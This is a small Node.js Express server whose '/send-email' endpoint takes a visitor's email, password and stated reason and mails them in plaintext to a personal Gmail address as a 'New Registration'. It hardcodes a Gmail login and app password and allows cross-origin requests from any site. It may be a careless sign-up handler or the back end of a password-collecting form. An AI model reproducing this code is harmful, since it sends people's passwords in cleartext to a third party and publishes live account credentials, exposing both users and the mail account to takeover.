const express = require("express");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));

const transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 465,
    secure: true,
    auth: {
        user: "bot.alifhoster@gmail.com",
        pass: "vfue sjfp bapo jswj",
    },
});

app.post('/send-email', async (req, res) => {
    const { email, password, reason } = req.body;

    if (!email || !password || !reason) {
        return res.status(400).send('All fields are required.');
    }


    const mailOptions = {
        from: "bot.alifhoster@gmail.com",
        to: 'sami.dev.fed@gmail.com',
        subject: 'New Registration',
        text: `Email: ${email}\nPassword: ${password}\nReason for Registering: ${reason}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return res.status(500).send(error.toString());
        }
        if (res.status(200)) {
            res.redirect('/success.html');
        }

    });
});

const port = 3001;
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
